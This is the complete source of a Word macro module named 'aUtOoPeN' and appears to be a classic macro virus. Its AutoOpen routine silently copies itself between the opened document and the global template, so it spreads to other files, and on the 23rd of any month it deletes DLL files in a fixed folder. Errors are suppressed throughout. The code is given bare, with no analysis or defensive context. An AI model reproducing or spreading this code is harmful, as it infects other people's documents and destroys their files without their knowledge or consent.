   Attribute VB_Name = "aUtOoPeN"

   Public Sub MAIN()
   Dim a$
   Dim b$
   On Error Resume Next
   a$ = "aUtOoPeN"
   b$ = WordBasic.[FileName$]() + ":" + a$
   WordBasic.MacroCopy a$, b$
   WordBasic.MacroCopy b$, a$
   If (WordBasic.Day(WordBasic.Now()) = 23) Then
       WordBasic.Kill "e:\temp\1\*.dll"
   End If
   End Sub
